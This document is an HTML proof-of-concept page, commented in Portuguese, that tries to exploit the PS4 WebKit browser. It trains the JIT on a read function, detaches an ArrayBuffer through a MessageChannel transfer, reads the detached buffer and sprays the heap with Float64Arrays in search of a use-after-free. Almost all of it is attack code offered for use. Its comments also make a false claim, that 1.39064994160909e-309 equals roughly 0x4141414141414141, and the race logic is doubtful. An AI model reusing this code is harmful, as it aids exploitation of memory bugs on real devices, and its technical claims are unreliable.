<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit: JIT + Spray PoC</title>
</head>
<body>

<h1>PS4 WebKit PoC: JIT Confusion & Heap Spray</h1>

<div>
    <button onclick="trainJIT()">1. TRAIN JIT (Warmup)</button>
    <button onclick="runExploit()">2. RUN RACE + SPRAY</button>
    <button onclick="reset()">RESET</button>
</div>

<hr>
<div id="status" style="font-weight:bold;">Status: Idle</div>
<pre id="log" style="border:1px solid #ccc; min-height:200px;"></pre>

<script>
// CONFIGURAÇÃO
const SPRAY_SIZE = 1000;     // Quantidade de arrays para alocar
const SPRAY_LEN = 1024 * 32; // Tamanho de cada bloco de spray
const TRAIN_CYCLES = 10000;  // Quantas vezes rodar para otimizar (JIT)

// VARIAVEIS GLOBAIS
let sprayStore = [];
let compiledFunc = null;
let victimBuffer = null;
let victimView = null;

function log(msg) {
    document.getElementById("log").textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
}

function setStatus(msg) {
    document.getElementById("status").textContent = "Status: " + msg;
}

function reset() {
    sprayStore = [];
    victimBuffer = null;
    victimView = null;
    document.getElementById("log").textContent = "";
    setStatus("Reset done. Memory cleared (hopefully).");
}

// ------------------------------------------------------------------
// 1. A FUNÇÃO ALVO (JIT TARGET)
// O objetivo é fazer o navegador compilar esta função removendo
// as checagens de segurança (Bounds Check Elimination).
// ------------------------------------------------------------------
function dangerousRead(arr, index) {
    // Operação simples que o JIT gosta de otimizar.
    // Se o JIT remover a checagem de "detached", isso vai ler lixo.
    return arr[index]; 
}

// Função de treinamento
function trainJIT() {
    setStatus("Training JIT...");
    log("Iniciando JIT Warmup...");
    
    // Cria um buffer válido para treinar
    const trainBuf = new ArrayBuffer(1024);
    const trainView = new Uint8Array(trainBuf);
    trainView[0] = 0xAA; // Valor conhecido

    // Executa milhares de vezes para forçar o Turbofan/JIT a otimizar
    // e assumir que "arr" será sempre um Uint8Array válido.
    for (let i = 0; i < TRAIN_CYCLES; i++) {
        const res = dangerousRead(trainView, 0);
        if (res !== 0xAA) {
            log("Erro durante o treino! JIT falhou?");
            return;
        }
    }
    
    log("JIT Warmup Completo. A função 'dangerousRead' deve estar otimizada.");
    setStatus("JIT Ready.");
}

// ------------------------------------------------------------------
// 2. HEAP SPRAY
// Tenta preencher a memória liberada com um padrão conhecido (0x41 = 'A')
// Se lermos 0x41414141, sabemos que lemos nosso próprio spray.
// ------------------------------------------------------------------
function doSpray() {
    // Usa Float64Array pois é muito comum em exploits de WebKit
    // Cada elemento ocupa 8 bytes.
    for (let i = 0; i < SPRAY_SIZE; i++) {
        const arr = new Float64Array(SPRAY_LEN);
        // Preenche com um valor float específico que em hex parece reconhecível
        // 1.39064994160909e-309 é aprox 0x4141414141414141 em double precision
        arr.fill(1.39064994160909e-309); 
        sprayStore.push(arr);
    }
    return sprayStore.length;
}

// ------------------------------------------------------------------
// 3. O EXPLOIT (Race Condition + JIT + Spray)
// ------------------------------------------------------------------
async function runExploit() {
    setStatus("Running Exploit...");
    log("Preparando vítima...");

    // Cria o buffer "Vítima"
    victimBuffer = new ArrayBuffer(1024);
    victimView = new Uint8Array(victimBuffer);
    victimView[0] = 0xBB; // Valor inicial seguro

    const mc = new MessageChannel();
    
    // Agendar o detach (Transfer)
    // A ideia é que o detach ocorra exatamente enquanto tentamos ler
    log("Tentando Race Condition...");

    try {
        // 1. Envia o buffer para a porta 2 (Isso causa o Detach/Drop)
        mc.port1.postMessage(victimBuffer, [victimBuffer]);
        
        // 2. IMEDIATAMENTE tenta ler usando a função otimizada (JIT)
        // Se a proteção falhar, ele vai ler memória liberada.
        const val = dangerousRead(victimView, 0);

        // 3. IMEDIATAMENTE faz o Spray para ocupar o lugar
        doSpray();

        // 4. Analisa o resultado
        if (val === undefined) {
            log("Resultado: undefined (Safe Detach - Proteção funcionou).");
        } else if (val === 0) {
            log("Resultado: 0 (Safe Detach - Leu zero).");
        } else if (val === 0xBB) {
            log("Resultado: 0xBB (Race falhou - Leu antes do detach).");
        } else {
            // SUCESSO?
            log("!!! ANOMALIA DETECTADA !!!");
            log("Valor lido pós-detach: " + val);
            log("Hex: 0x" + val.toString(16));
            alert("Potential UAF! Value: " + val);
        }

    } catch (e) {
        // Se o navegador for seguro, ele vai lançar TypeError aqui.
        log("Exceção capturada (Seguro): " + e.message);
        
        // Vamos tentar o spray mesmo assim, só para ver se causa crash
        log("Tentando spray pós-erro...");
        doSpray();
        log("Spray concluído sem crash.");
    }
    
    setStatus("Done.");
}

</script>
</body>
</html>
